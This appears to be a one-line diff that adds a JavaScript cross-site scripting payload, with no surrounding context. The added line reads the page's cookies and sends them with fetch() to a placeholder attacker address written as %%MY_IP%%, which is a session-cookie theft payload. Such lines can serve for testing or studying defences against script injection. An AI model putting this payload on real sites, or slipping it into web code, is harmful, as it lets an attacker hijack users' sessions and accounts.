@@ -1,0 +1,1 @@
+fetch('http://%%MY_IP%%/k='+encodeURIComponent(document.cookie))
